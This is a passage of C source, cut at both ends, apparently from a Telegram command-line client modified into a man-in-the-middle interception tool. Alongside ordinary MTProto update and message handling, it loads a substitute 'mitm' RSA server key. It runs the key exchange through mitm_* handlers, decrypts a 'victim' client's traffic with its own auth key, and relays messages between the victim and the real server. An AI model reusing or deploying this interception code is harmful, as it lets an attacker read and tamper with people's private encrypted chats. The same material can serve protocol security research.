    return -1;
  }
  if (msg) {
    memcpy (enc_msg.message, msg, msg_ints * 4);
    enc_msg.msg_len = msg_ints * 4;
  } else {
    if ((enc_msg.msg_len & 0x80000003) || enc_msg.msg_len > MAX_MESSAGE_INTS * 4 - 16) {
      return -1;
    }
  }
  init_enc_msg (S, useful);

  //hexdump ((char *)msg, (char *)msg + (msg_ints * 4));
  int l = aes_encrypt_message (DC, &enc_msg);
  //hexdump ((char *)&enc_msg, (char *)&enc_msg + l  + 24);
  assert (l > 0);
  rpc_send_message (c, &enc_msg, l + UNENCSZ);
  
  return client_last_msg_id;
}

int longpoll_count, good_messages;

int auth_work_start (struct connection *c UU) {
  return 1;
}

void rpc_execute_answer (struct connection *c, long long msg_id UU);

int unread_messages;
int our_id;
int pts;
int qts;
int last_date;
int seq;

void fetch_pts (void) {
  int p = fetch_int ();
  if (p <= pts) { return; }
  if (p != pts + 1) {
    if (pts) {
      //logprintf ("Hole in pts p = %d, pts = %d\n", p, pts);

      // get difference should be here
      pts = p;
    } else {
      pts = p;
    }
  } else {
    pts ++;
  }
  bl_do_set_pts (pts);
}

void fetch_qts (void) {
  int p = fetch_int ();
  if (p <= qts) { return; }
  if (p != qts + 1) {
    if (qts) {
      //logprintf ("Hole in qts\n");
      // get difference should be here
      qts = p;
    } else {
      qts = p;
    }
  } else {
    qts ++;
  }
  bl_do_set_qts (qts);
}

void fetch_date (void) {
  int p = fetch_int ();
  if (p > last_date) {
    last_date = p;
    bl_do_set_date (last_date);
  }
}

void fetch_seq (void) {
  int x = fetch_int ();
  if (x > seq + 1) {
    logprintf ("Hole in seq: seq = %d, x = %d\n", seq, x);
    //do_get_difference ();
    //seq = x;
  } else if (x == seq + 1) {
    seq = x;
    bl_do_set_seq (seq);
  }
}

void work_update_binlog (void) {
  unsigned op = fetch_int ();
  switch (op) {
  case CODE_update_user_name:
    {
      peer_id_t user_id = MK_USER (fetch_int ());
      peer_t *UC = user_chat_get (user_id);
      if (UC) {
        struct user *U = &UC->user;
        if (U->first_name) { tfree_str (U->first_name); }
        if (U->last_name) { tfree_str (U->last_name); }
        if (U->print_name) { 
          peer_delete_name (UC);
          tfree_str (U->print_name); 
        }
        U->first_name = fetch_str_dup ();
        U->last_name = fetch_str_dup ();
        U->print_name = create_print_name (U->id, U->first_name, U->last_name, 0, 0);
        peer_insert_name ((void *)U);
      } else {
        fetch_skip_str ();
        fetch_skip_str ();
      }
    }
    break;
  case CODE_update_user_photo:
    {
      peer_id_t user_id = MK_USER (fetch_int ());
      peer_t *UC = user_chat_get (user_id);
      fetch_date ();
      if (UC) {
        struct user *U = &UC->user;
        
        unsigned y = fetch_int ();
        if (y == CODE_user_profile_photo_empty) {
          U->photo_id = 0;
          U->photo_big.dc = -2;
          U->photo_small.dc = -2;
        } else {
          assert (y == CODE_user_profile_photo);
          U->photo_id = fetch_long ();
          fetch_file_location (&U->photo_small);
          fetch_file_location (&U->photo_big);
        }
      } else {
        struct file_location t;
        unsigned y = fetch_int ();
        if (y == CODE_user_profile_photo_empty) {
        } else {
          assert (y == CODE_user_profile_photo);
          fetch_long (); // photo_id
          fetch_file_location (&t);
          fetch_file_location (&t);
        }
      }
      fetch_bool ();
    }
    break;
  default:
    assert (0);
  }
}

void work_update (struct connection *c UU, long long msg_id UU) {
  unsigned op = fetch_int ();
  switch (op) {
  case CODE_update_new_message:
    {
      struct message *M = fetch_alloc_message ();
      assert (M);
      fetch_pts ();
      unread_messages ++;
      print_message (M);
      update_prompt ();
      break;
    };
  case CODE_update_message_i_d:
    {
      int id = fetch_int (); // id
      int new = fetch_long (); // random_id
      struct message *M = message_get (new);
      if (M) {
        bl_do_set_msg_id (M, id);
      }
    }
    break;
  case CODE_update_read_messages:
    {
      assert (fetch_int () == (int)CODE_vector);
      int n = fetch_int ();
      int i;
      for (i = 0; i < n; i++) {
        int id = fetch_int ();
        struct message *M = message_get (id);
        if (M) {
          bl_do_set_unread (M, 0);
        }
      }
      fetch_pts ();
      if (log_level >= 1) {
        print_start ();
        push_color (COLOR_YELLOW);
        print_date (time (0));
        printf (" %d messages marked as read\n", n);
        pop_color ();
        print_end ();
      }
    }
    break;
  case CODE_update_user_typing:
    {
      peer_id_t id = MK_USER (fetch_int ());
      peer_t *U = user_chat_get (id);
      if (log_level >= 2) {
        print_start ();
        push_color (COLOR_YELLOW);
        print_date (time (0));
        printf (" User ");
        print_user_name (id, U);
        printf (" is typing....\n");
        pop_color ();
        print_end ();
      }
    }
    break;
  case CODE_update_chat_user_typing:
    {
      peer_id_t chat_id = MK_CHAT (fetch_int ());
      peer_id_t id = MK_USER (fetch_int ());
      peer_t *C = user_chat_get (chat_id);
      peer_t *U = user_chat_get (id);
      if (log_level >= 2) {
        print_start ();
        push_color (COLOR_YELLOW);
        print_date (time (0));
        printf (" User ");
        print_user_name (id, U);
        printf (" is typing in chat ");
        print_chat_name (chat_id, C);
        printf ("....\n");
        pop_color ();
        print_end ();
      }
    }
    break;
  case CODE_update_user_status:
    {
      peer_id_t user_id = MK_USER (fetch_int ());
      peer_t *U = user_chat_get (user_id);
      if (U) {
        fetch_user_status (&U->user.status);
        if (log_level >= 3) {
          print_start ();
          push_color (COLOR_YELLOW);
          print_date (time (0));
          printf (" User ");
          print_user_name (user_id, U);
          printf (" is now ");
          printf ("%s\n", (U->user.status.online > 0) ? "online" : "offline");
          pop_color ();
          print_end ();
        }
      } else {
        struct user_status t;
        fetch_user_status (&t);
      }
    }
    break;
  case CODE_update_user_name:
    {
      peer_id_t user_id = MK_USER (fetch_int ());
      peer_t *UC = user_chat_get (user_id);
      if (UC && (UC->flags & FLAG_CREATED)) {
        int l1 = prefetch_strlen ();
        char *f = fetch_str (l1);
        int l2 = prefetch_strlen ();
        char *l = fetch_str (l2);
        struct user *U = &UC->user;
        bl_do_set_user_real_name (U, f, l1, l, l2);
        print_start ();
        push_color (COLOR_YELLOW);
        print_date (time (0));
        printf (" User ");
        print_user_name (user_id, UC);
        printf (" changed name to ");
        print_user_name (user_id, UC);
        printf ("\n");
        pop_color ();
        print_end ();
      } else {
        fetch_skip_str ();
        fetch_skip_str ();
      }
    }
    break;
  case CODE_update_user_photo:
    {
      peer_id_t user_id = MK_USER (fetch_int ());
      peer_t *UC = user_chat_get (user_id);
      fetch_date ();
      if (UC && (UC->flags & FLAG_CREATED)) {
        struct user *U = &UC->user;
        unsigned y = fetch_int ();
        long long photo_id;
        struct file_location big;
        struct file_location small;
        memset (&big, 0, sizeof (big));
        memset (&small, 0, sizeof (small));
        if (y == CODE_user_profile_photo_empty) {
          photo_id = 0;
          big.dc = -2;
          small.dc = -2;
        } else {
          assert (y == CODE_user_profile_photo);
          photo_id = fetch_long ();
          fetch_file_location (&small);
          fetch_file_location (&big);
        }
        bl_do_set_user_profile_photo (U, photo_id, &big, &small);
        
        print_start ();
        push_color (COLOR_YELLOW);
        print_date (time (0));
        printf (" User ");
        print_user_name (user_id, UC);
        printf (" updated profile photo\n");
        pop_color ();
        print_end ();
      } else {
        struct file_location t;
        unsigned y = fetch_int ();
        if (y == CODE_user_profile_photo_empty) {
        } else {
          assert (y == CODE_user_profile_photo);
          fetch_long (); // photo_id
          fetch_file_location (&t);
          fetch_file_location (&t);
        }
      }
      fetch_bool ();
    }
    break;
  case CODE_update_restore_messages:
    {
      assert (fetch_int () == CODE_vector);
      int n = fetch_int ();
      print_start ();
      push_color (COLOR_YELLOW);
      print_date (time (0));
      printf (" Restored %d messages\n", n);
      pop_color ();
      print_end ();
      fetch_skip (n);
      fetch_pts ();
    }
    break;
  case CODE_update_delete_messages:
    {
      assert (fetch_int () == CODE_vector);
      int n = fetch_int ();
      print_start ();
      push_color (COLOR_YELLOW);
      print_date (time (0));
      printf (" Deleted %d messages\n", n);
      pop_color ();
      print_end ();
      fetch_skip (n);
      fetch_pts ();
    }
    break;
  case CODE_update_chat_participants:
    {
      unsigned x = fetch_int ();
      assert (x == CODE_chat_participants || x == CODE_chat_participants_forbidden);
      peer_id_t chat_id = MK_CHAT (fetch_int ());
      int n = 0;
      peer_t *C = user_chat_get (chat_id);
      if (C && (C->flags & FLAG_CREATED)) {
        if (x == CODE_chat_participants) {
          bl_do_set_chat_admin (&C->chat, fetch_int ());
          assert (fetch_int () == CODE_vector);
          n = fetch_int ();
          struct chat_user *users = talloc (12 * n);
          int i;
          for (i = 0; i < n; i++) {
            assert (fetch_int () == (int)CODE_chat_participant);
            users[i].user_id = fetch_int ();
            users[i].inviter_id = fetch_int ();
            users[i].date = fetch_int ();
          }
          int version = fetch_int (); 
          bl_do_set_chat_participants (&C->chat, version, n, users);
        }
      } else {
        if (x == CODE_chat_participants) {
          fetch_int (); // admin_id
          assert (fetch_int () == CODE_vector);
          n = fetch_int ();
          fetch_skip (n * 4);
          fetch_int (); // version
        }
      }
      print_start ();
      push_color (COLOR_YELLOW);
      print_date (time (0));
      printf (" Chat ");
      print_chat_name (chat_id, C);
      if (x == CODE_chat_participants) {
        printf (" changed list: now %d members\n", n);
      } else {
        printf (" changed list, but we are forbidden to know about it (Why this update even was sent to us?\n");
      }
      pop_color ();
      print_end ();
    }
    break;
  case CODE_update_contact_registered:
    {
      peer_id_t user_id = MK_USER (fetch_int ());
      peer_t *U = user_chat_get (user_id);
      fetch_int (); // date
      print_start ();
      push_color (COLOR_YELLOW);
      print_date (time (0));
      printf (" User ");
      print_user_name (user_id, U);
      printf (" registered\n");
      pop_color ();
      print_end ();
    }
    break;
  case CODE_update_contact_link:
    {
      peer_id_t user_id = MK_USER (fetch_int ());
      peer_t *U = user_chat_get (user_id);
      print_start ();
      push_color (COLOR_YELLOW);
      print_date (time (0));
      printf (" Updated link with user ");
      print_user_name (user_id, U);
      printf ("\n");
      pop_color ();
      print_end ();
      unsigned t = fetch_int ();
      assert (t == CODE_contacts_my_link_empty || t == CODE_contacts_my_link_requested || t == CODE_contacts_my_link_contact);
      if (t == CODE_contacts_my_link_requested) {
        fetch_bool (); // has_phone
      }
      t = fetch_int ();
      assert (t == CODE_contacts_foreign_link_unknown || t == CODE_contacts_foreign_link_requested || t == CODE_contacts_foreign_link_mutual);
      if (t == CODE_contacts_foreign_link_requested) {
        fetch_bool (); // has_phone
      }
    }
    break;
  case CODE_update_activation:
    {
      peer_id_t user_id = MK_USER (fetch_int ());
      peer_t *U = user_chat_get (user_id);
      print_start ();
      push_color (COLOR_YELLOW);
      print_date (time (0));
      printf (" User ");
      print_user_name (user_id, U);
      printf (" activated\n");
      pop_color ();
      print_end ();
    }
    break;
  case CODE_update_new_authorization:
    {
      fetch_long (); // auth_key_id
      fetch_int (); // date
      char *s = fetch_str_dup ();
      char *location = fetch_str_dup ();
      print_start ();
      push_color (COLOR_YELLOW);
      print_date (time (0));
      printf (" New autorization: device='%s' location='%s'\n",
        s, location);
      pop_color ();
      print_end ();
      tfree_str (s);
      tfree_str (location);
    }
    break;
  case CODE_update_new_geo_chat_message:
    {
      struct message *M = fetch_alloc_geo_message ();
      unread_messages ++;
      print_message (M);
      update_prompt ();
    }
    break;
  case CODE_update_new_encrypted_message:
    {
      struct message *M = fetch_alloc_encrypted_message ();
      unread_messages ++;
      print_message (M);
      update_prompt ();
      fetch_qts ();
    }
    break;
  case CODE_update_encryption:
    {
      struct secret_chat *E = fetch_alloc_encrypted_chat ();
      if (verbosity >= 2) {
        logprintf ("Secret chat state = %d\n", E->state);
      }
      print_start ();
      push_color (COLOR_YELLOW);
      print_date (time (0));
      switch (E->state) {
      case sc_none:
        break;
      case sc_waiting:
        printf (" Encrypted chat ");
        print_encr_chat_name (E->id, (void *)E);
        printf (" is now in wait state\n");
        break;
      case sc_request:
        printf (" Encrypted chat ");
        print_encr_chat_name (E->id, (void *)E);
        printf (" is now in request state. Sending request ok\n");
        break;
      case sc_ok:
        printf (" Encrypted chat ");
        print_encr_chat_name (E->id, (void *)E);
        printf (" is now in ok state\n");
        break;
      case sc_deleted:
        printf (" Encrypted chat ");
        print_encr_chat_name (E->id, (void *)E);
        printf (" is now in deleted state\n");
        break;
      }
      pop_color ();
      print_end ();
      if (E->state == sc_request && !disable_auto_accept) {
        do_accept_encr_chat_request (E);
      }
      fetch_int (); // date
    }
    break;
  case CODE_update_encrypted_chat_typing:
    {
      peer_id_t id = MK_ENCR_CHAT (fetch_int ());
      peer_t *P = user_chat_get (id);
      print_start ();
      push_color (COLOR_YELLOW);
      print_date (time (0));
      if (P) {
        printf (" User ");
        peer_id_t user_id = MK_USER (P->encr_chat.user_id);
        print_user_name (user_id, user_chat_get (user_id));
        printf (" typing in secret chat ");
        print_encr_chat_name (id, P);
        printf ("\n");
      } else {
        printf (" Some user is typing in unknown secret chat\n");
      }
      pop_color ();
      print_end ();
    }
    break;
  case CODE_update_encrypted_messages_read:
    {
      peer_id_t id = MK_ENCR_CHAT (fetch_int ()); // chat_id
      fetch_int (); // max_date
      fetch_int (); // date
      peer_t *P = user_chat_get (id);
      int x = -1;
      if (P && P->last) {
        x = 0;
        struct message *M = P->last;
        while (M && (!M->out || M->unread)) {
          if (M->out) {
            M->unread = 0;
            x ++;
          }
          M = M->next;
        }
      }
      if (log_level >= 1) {
        print_start ();
        push_color (COLOR_YELLOW);
        print_date (time (0));
        printf (" Encrypted chat ");
        print_encr_chat_name_full (id, user_chat_get (id));
        printf (": %d messages marked read \n", x);
        pop_color ();
        print_end ();
      }
    }
    break;
  case CODE_update_chat_participant_add:
    {
      peer_id_t chat_id = MK_CHAT (fetch_int ());
      peer_id_t user_id = MK_USER (fetch_int ());
      peer_id_t inviter_id = MK_USER (fetch_int ());
      int  version = fetch_int (); 
      
      peer_t *C = user_chat_get (chat_id);
      if (C && (C->flags & FLAG_CREATED)) {
        bl_do_chat_add_user (&C->chat, version, get_peer_id (user_id), get_peer_id (inviter_id), time (0));
      }

      print_start ();
      push_color (COLOR_YELLOW);
      print_date (time (0));
      printf (" Chat ");
      print_chat_name (chat_id, user_chat_get (chat_id));
      printf (": user ");
      print_user_name (user_id, user_chat_get (user_id));
      printf (" added by user ");
      print_user_name (inviter_id, user_chat_get (inviter_id));
      printf ("\n");
      pop_color ();
      print_end ();
    }
    break;
  case CODE_update_chat_participant_delete:
    {
      peer_id_t chat_id = MK_CHAT (fetch_int ());
      peer_id_t user_id = MK_USER (fetch_int ());
      int version = fetch_int ();
      
      peer_t *C = user_chat_get (chat_id);
      if (C && (C->flags & FLAG_CREATED)) {
        bl_do_chat_del_user (&C->chat, version, get_peer_id (user_id));
      }

      print_start ();
      push_color (COLOR_YELLOW);
      print_date (time (0));
      printf (" Chat ");
      print_chat_name (chat_id, user_chat_get (chat_id));
      printf (": user ");
      print_user_name (user_id, user_chat_get (user_id));
      printf (" deleted\n");
      pop_color ();
      print_end ();
    }
    break;
  default:
    logprintf ("Unknown update type %08x\n", op);
    ;
  }
}

void work_update_short (struct connection *c, long long msg_id) {
  assert (fetch_int () == CODE_update_short);
  work_update (c, msg_id);
  fetch_date ();
}

void work_updates (struct connection *c, long long msg_id) {
  assert (fetch_int () == CODE_updates);
  assert (fetch_int () == CODE_vector);
  int n = fetch_int ();
  int i;
  for (i = 0; i < n; i++) {
    work_update (c, msg_id);
  }
  assert (fetch_int () == CODE_vector);
  n = fetch_int ();
  for (i = 0; i < n; i++) {
    fetch_alloc_user ();
  }
  assert (fetch_int () == CODE_vector);
  n = fetch_int ();
  for (i = 0; i < n; i++) {
    fetch_alloc_chat ();
  }
  bl_do_set_date (fetch_int ());
  bl_do_set_seq (fetch_int ());
}

void work_update_short_message (struct connection *c UU, long long msg_id UU) {
  assert (fetch_int () == (int)CODE_update_short_message);
  struct message *M = fetch_alloc_message_short ();  
  unread_messages ++;
  print_message (M);
  update_prompt ();
  if (M->date > last_date) {
    last_date = M->date;
  }
}

void work_update_short_chat_message (struct connection *c UU, long long msg_id UU) {
  assert (fetch_int () == CODE_update_short_chat_message);
  struct message *M = fetch_alloc_message_short_chat ();  
  unread_messages ++;
  print_message (M);
  update_prompt ();
  if (M->date > last_date) {
    last_date = M->date;
  }
}

void work_container (struct connection *c, long long msg_id UU) {
  if (verbosity) {
    logprintf ( "work_container: msg_id = %lld\n", msg_id);
  }
  assert (fetch_int () == CODE_msg_container);
  int n = fetch_int ();
  int i;
  for (i = 0; i < n; i++) {
    long long id = fetch_long (); 
    //int seqno = fetch_int (); 
    fetch_int (); // seq_no
    if (id & 1) {
      insert_msg_id (c->session, id);
    }
    int bytes = fetch_int ();
    int *t = in_end;
    in_end = in_ptr + (bytes / 4);
    rpc_execute_answer (c, id);
    assert (in_ptr == in_end);
    in_end = t;
  }
}

void work_new_session_created (struct connection *c, long long msg_id UU) {
  if (verbosity) {
    logprintf ( "work_new_session_created: msg_id = %lld\n", msg_id);
  }
  assert (fetch_int () == (int)CODE_new_session_created);
  fetch_long (); // first message id
  //DC->session_id = fetch_long ();
  fetch_long (); // unique_id
  GET_DC(c)->server_salt = fetch_long ();
  
}

void work_msgs_ack (struct connection *c UU, long long msg_id UU) {
  if (verbosity) {
    logprintf ( "work_msgs_ack: msg_id = %lld\n", msg_id);
  }
  assert (fetch_int () == CODE_msgs_ack);
  assert (fetch_int () == CODE_vector);
  int n = fetch_int ();
  int i;
  for (i = 0; i < n; i++) {
    long long id = fetch_long ();
    if (verbosity) {
      logprintf ("ack for %lld\n", id);
    }
    query_ack (id);
  }
}

void work_rpc_result (struct connection *c UU, long long msg_id UU) {
  if (verbosity) {
    logprintf ( "work_rpc_result: msg_id = %lld\n", msg_id);
  }
  assert (fetch_int () == (int)CODE_rpc_result);
  long long id = fetch_long ();
  int op = prefetch_int ();
  if (op == CODE_rpc_error) {
    query_error (id);
  } else {
    query_result (id);
  }
}

#define MAX_PACKED_SIZE (1 << 24)
void work_packed (struct connection *c, long long msg_id) {
  assert (fetch_int () == CODE_gzip_packed);
  static int in_gzip;
  static int buf[MAX_PACKED_SIZE >> 2];
  assert (!in_gzip);
  in_gzip = 1;
    
  int l = prefetch_strlen ();
  char *s = fetch_str (l);

  int total_out = tinflate (s, l, buf, MAX_PACKED_SIZE);
  int *end = in_ptr;
  int *eend = in_end;
  //assert (total_out % 4 == 0);
  in_ptr = buf;
  in_end = in_ptr + total_out / 4;
  if (verbosity >= 4) {
    logprintf ( "Unzipped data: ");
    hexdump_in ();
  }
  rpc_execute_answer (c, msg_id);
  in_ptr = end;
  in_end = eend;
  in_gzip = 0;
}

void work_bad_server_salt (struct connection *c UU, long long msg_id UU) {
  assert (fetch_int () == (int)CODE_bad_server_salt);
  long long id = fetch_long ();
  query_restart (id);
  fetch_int (); // seq_no
  fetch_int (); // error_code
  long long new_server_salt = fetch_long ();
  GET_DC(c)->server_salt = new_server_salt;
}

void work_pong (struct connection *c UU, long long msg_id UU) {
  assert (fetch_int () == CODE_pong);
  fetch_long (); // msg_id
  fetch_long (); // ping_id
}

void work_detailed_info (struct connection *c UU, long long msg_id UU) {
  assert (fetch_int () == CODE_msg_detailed_info);
  fetch_long (); // msg_id
  fetch_long (); // answer_msg_id
  fetch_int (); // bytes
  fetch_int (); // status
}

void work_new_detailed_info (struct connection *c UU, long long msg_id UU) {
  assert (fetch_int () == (int)CODE_msg_new_detailed_info);
  fetch_long (); // answer_msg_id
  fetch_int (); // bytes
  fetch_int (); // status
}

void work_updates_to_long (struct connection *c UU, long long msg_id UU) {
  assert (fetch_int () == (int)CODE_updates_too_long);
  logprintf ("updates to long... Getting difference\n");
  do_get_difference ();
}

void work_bad_msg_notification (struct connection *c UU, long long msg_id UU) {
  assert (fetch_int () == (int)CODE_bad_msg_notification);
  long long m1 = fetch_long ();
  int s = fetch_int ();
  int e = fetch_int ();
  logprintf ("bad_msg_notification: msg_id = %lld, seq = %d, error = %d\n", m1, s, e);
}

void rpc_execute_answer (struct connection *c, long long msg_id UU) {
  if (verbosity >= 5) {
    logprintf ("rpc_execute_answer: fd=%d\n", c->fd);
    hexdump_in ();
  }
  int op = prefetch_int ();
  switch (op) {
  case CODE_msg_container:
    work_container (c, msg_id);
    return;
  case CODE_new_session_created:
    work_new_session_created (c, msg_id);
    return;
  case CODE_msgs_ack:
    work_msgs_ack (c, msg_id);
    return;
  case CODE_rpc_result:
    work_rpc_result (c, msg_id);
    return;
  case CODE_update_short:
    work_update_short (c, msg_id);
    return;
  case CODE_updates:
    work_updates (c, msg_id);
    return;
  case CODE_update_short_message:
    work_update_short_message (c, msg_id);
    return;
  case CODE_update_short_chat_message:
    work_update_short_chat_message (c, msg_id);
    return;
  case CODE_gzip_packed:
    work_packed (c, msg_id);
    return;
  case CODE_bad_server_salt:
    work_bad_server_salt (c, msg_id);
    return;
  case CODE_pong:
    work_pong (c, msg_id);
    return;
  case CODE_msg_detailed_info:
    work_detailed_info (c, msg_id);
    return;
  case CODE_msg_new_detailed_info:
    work_new_detailed_info (c, msg_id);
    return;
  case CODE_updates_too_long:
    work_updates_to_long (c, msg_id);
    return;
  case CODE_bad_msg_notification:
    work_bad_msg_notification (c, msg_id);
    return;
  }
  logprintf ( "Unknown message: \n");
  hexdump_in ();
  in_ptr = in_end; // Will not fail due to assertion in_ptr == in_end
}

int mitm_process_rpc_message (struct connection *c UU, struct encrypted_message *enc, int len) {
  mitm_tg2victim((char *) enc, len, GET_DC(c));
  return 0;
 }

 int process_rpc_message (struct connection *c UU, struct encrypted_message *enc, int len) {
   const int MINSZ = offsetof (struct encrypted_message, message);
   const int UNENCSZ = offsetof (struct encrypted_message, server_salt);
   if (verbosity) {
     logprintf ( "process_rpc_message(), len=%d\n", len);  
   }
   assert (len >= MINSZ && (len & 15) == (UNENCSZ & 15));
   struct dc *DC = GET_DC(c);
   assert (enc->auth_key_id == DC->auth_key_id);
   assert (DC->auth_key_id);
   init_aes_auth (DC->auth_key + 8, enc->msg_key, AES_DECRYPT);
   int l = pad_aes_decrypt ((char *)&enc->server_salt, len - UNENCSZ, (char *)&enc->server_salt, len - UNENCSZ);
   assert (l == len - UNENCSZ);
   //assert (enc->auth_key_id2 == enc->auth_key_id);
   assert (!(enc->msg_len & 3) && enc->msg_len > 0 && enc->msg_len <= len - MINSZ && len - MINSZ - enc->msg_len <= 12);
   static unsigned char sha1_buffer[20];
   sha1 ((void *)&enc->server_salt, enc->msg_len + (MINSZ - UNENCSZ), sha1_buffer);
   assert (!memcmp (&enc->msg_key, sha1_buffer + 4, 16));
   //assert (enc->server_salt == server_salt); //in fact server salt can change
   if (DC->server_salt != enc->server_salt) {
     DC->server_salt = enc->server_salt;
     write_auth_file ();
   }

   int this_server_time = enc->msg_id >> 32LL;
   if (!DC->server_time_delta) {
     DC->server_time_delta = this_server_time - get_utime (CLOCK_REALTIME);
     DC->server_time_udelta = this_server_time - get_utime (CLOCK_MONOTONIC);
   }
   double st = get_server_time (DC);
   if (this_server_time < st - 300 || this_server_time > st + 30) {
     logprintf ("salt = %lld, session_id = %lld, msg_id = %lld, seq_no = %d, st = %lf, now = %lf\n", enc->server_salt, enc->session_id, enc->msg_id, enc->seq_no, st, get_utime (CLOCK_REALTIME));
     in_ptr = enc->message;
     in_end = in_ptr + (enc->msg_len / 4);
     hexdump_in ();
   }

   assert (this_server_time >= st - 300 && this_server_time <= st + 30);
   //assert (enc->msg_id > server_last_msg_id && (enc->msg_id & 3) == 1);
   if (verbosity >= 1) {
     logprintf ( "received mesage id %016llx\n", enc->msg_id);
     hexdump_in ();
   }
   server_last_msg_id = enc->msg_id;

   //*(long long *)(longpoll_query + 3) = *(long long *)((char *)(&enc->msg_id) + 0x3c);
   //*(long long *)(longpoll_query + 5) = *(long long *)((char *)(&enc->msg_id) + 0x3c);

   assert (l >= (MINSZ - UNENCSZ) + 8);
   //assert (enc->message[0] == CODE_rpc_result && *(long long *)(enc->message + 1) == client_last_msg_id);
   ++good_messages;

   in_ptr = enc->message;
   in_end = in_ptr + (enc->msg_len / 4);

   if (enc->msg_id & 1) {
     insert_msg_id (c->session, enc->msg_id);
   }
   assert (c->session->session_id == enc->session_id);
   rpc_execute_answer (c, enc->msg_id);
   assert (in_ptr == in_end);
   return 0;
 }


 int rpc_execute (struct connection *c, int op, int len) {

   if (verbosity) {
     logprintf ( "outbound rpc connection #%d : received rpc answer %d with %d content bytes\n", c->fd, op, len);
   }
 /*  if (op < 0) {
     assert (read_in (c, Response, Response_len) == Response_len);
     return 0;
   }*/

   if (len >= MAX_RESPONSE_SIZE/* - 12*/ || len < 0/*12*/) {
     logprintf ( "answer too long (%d bytes), skipping\n", len);
     return 0;
   }

   int Response_len = len;

   if (verbosity >= 2) {
     logprintf ("Response_len = %d\n", Response_len);
   }
   assert (read_in (c, Response, Response_len) == Response_len);
   Response[Response_len] = 0;
   if (verbosity >= 2) {
     logprintf ( "have %d Response bytes\n", Response_len);
   }

 #if !defined(__MACH__) && !defined(__FreeBSD__) && !defined (__CYGWIN__)
   setsockopt (c->fd, IPPROTO_TCP, TCP_QUICKACK, (int[]){0}, 4);
 #endif
   int o = c_state;
   if (GET_DC(c)->flags & 1) { o = st_authorized;}
   switch (o) {
   case st_reqpq_sent:
     mitm_process_respq_answer (c, Response/* + 8*/, Response_len/* - 12*/);
 #if !defined(__MACH__) && !defined(__FreeBSD__) && !defined (__CYGWIN__)
     setsockopt (c->fd, IPPROTO_TCP, TCP_QUICKACK, (int[]){0}, 4);
 #endif
     return 0;
   case st_reqdh_sent:
     mitm_process_dh_answer (c, Response/* + 8*/, Response_len/* - 12*/);
 #if !defined(__MACH__) && !defined(__FreeBSD__) && !defined (__CYGWIN__)
     setsockopt (c->fd, IPPROTO_TCP, TCP_QUICKACK, (int[]){0}, 4);
 #endif
     return 0;
   case st_client_dh_sent:
     mitm_process_auth_complete (c, Response/* + 8*/, Response_len/* - 12*/);
 #if !defined(__MACH__) && !defined(__FreeBSD__) && !defined (__CYGWIN__)
     setsockopt (c->fd, IPPROTO_TCP, TCP_QUICKACK, (int[]){0}, 4);
 #endif
     return 0;
   case st_authorized:
     if (op < 0 && op >= -999) {
       logprintf ("Server error %d\n", op);
       mitm_tg2victim((char *) &op, sizeof(int), GET_DC(c));
     } else {
       mitm_process_rpc_message (c, (void *)(Response/* + 8*/), Response_len/* - 12*/);
     }
 #if !defined(__MACH__) && !defined(__FreeBSD__) && !defined (__CYGWIN__)
     setsockopt (c->fd, IPPROTO_TCP, TCP_QUICKACK, (int[]){0}, 4);
 #endif
     return 0;
   default:
     logprintf ( "fatal: cannot receive answer in state %d\n", c_state);
     exit (2);
   }

   return 0;
 }


 int tc_close (struct connection *c, int who) {
   if (verbosity) {
     logprintf ( "outbound http connection #%d : closing by %d\n", c->fd, who);
   }
   return 0;
 }

 int tc_becomes_ready (struct connection *c) {
   if (verbosity) {
     logprintf ( "outbound connection #%d becomes ready\n", c->fd);
   }
   char byte = 0xef;
   assert (write_out (c, &byte, 1) == 1);
   flush_out (c);

 #if !defined(__MACH__) && !defined(__FreeBSD__) && !defined (__CYGWIN__)
   setsockopt (c->fd, IPPROTO_TCP, TCP_QUICKACK, (int[]){0}, 4);
 #endif
   int o = c_state;
   if (GET_DC(c)->flags & 1) { o = st_authorized; }
   switch (o) {
   case st_init:
     mitm_send_req_pq_packet (c);
     break;
   case st_authorized:
     auth_work_start (c);
     break;
   default:
     logprintf ( "c_state = %d\n", c_state);
     assert (0);
   }
   return 0;
 }

 int rpc_becomes_ready (struct connection *c) {
   return tc_becomes_ready (c);
 }

 int rpc_close (struct connection *c) {
   return tc_close (c, 0);
 }

 int auth_is_success (void) {
   return auth_success;
 }

 void on_start (void) {
   prng_seed (0, 0);

   if (rsa_public_key_name) {
     if (rsa_load_public_key (rsa_public_key_name) < 0) {
       perror ("rsa_load_public_key");
       exit (1);
     }

     if (mitm_rsa_load_public_key ("mitm-tg.pub") < 0) {
       perror ("rsa_load_public_key");
       exit (1);
     }

   } else {
     if (rsa_load_public_key ("tg.pub") < 0 && rsa_load_public_key ("/etc/" PROG_NAME "/server.pub") < 0) {
       perror ("rsa_load_public_key");
       exit (1);
     }
     // begin MITM implementation modification
     if (mitm_rsa_load_public_key ("mitm-tg.pub") < 0 && rsa_load_public_key ("/etc/" PROG_NAME "/mitm-server.pub") < 0) {
       perror ("rsa_load_public_key");
       exit (1);
     }
     // end MITM implementation modification
   }
   pk_fingerprint = compute_rsa_key_fingerprint (pubKey);
   // begin MITM implementation modification
   mitm_pk_fingerprint = compute_rsa_key_fingerprint (mitm_pubKey);
   // end MITM implementation modification
 }

 int auth_ok (void) {
   return auth_success;
 }

 void dc_authorize (struct dc *DC) {
   c_state = 0;
   auth_success = 0;
   if (!DC->sessions[0]) {
     dc_create_session (DC);
   }
   if (verbosity) {
     logprintf ( "Starting authorization for DC #%d: %s:%d\n", DC->id, DC->ip, DC->port);
   }
   net_loop (0, auth_ok);
 }

 void* mitm_victim2tg(void *arg) {

   char *data, size[4];
   int len, size_len;
   struct dc *DC_working;
   struct connection *c;
   /* struct connection_buffer *in_head; */
   struct encrypted_message enc;
   const int UNENCSZ = offsetof (struct encrypted_message, server_salt);
      
   while(1) {

     DC_working = (struct dc *) arg;

     /* Read from the socket established with the victim */
     data = NULL; len=0; memset(size, 0, 4); size_len = 0;
     mitm_recv_with_size(mitm_victim_fd, &data, &len, size, &size_len);

     /* just in case... */
     data = realloc(data, MAX_MESSAGE_INTS);
     
     /* Prepend the size ("self-legacy" issue...) */
     memmove(data+size_len, data, len);
     memcpy(data, size, size_len);

     /* Fake a connection for easily parsing the data using the      
	already defined functions... */
     c = (struct connection *) talloc0(sizeof(*c));

     try_read_from_buffer (c, (unsigned char *) data, len+size_len, 1);
     assert(read_in (c, &enc, len+size_len) == len);

     init_aes_auth (mitm_auth_key, enc.msg_key, AES_DECRYPT);
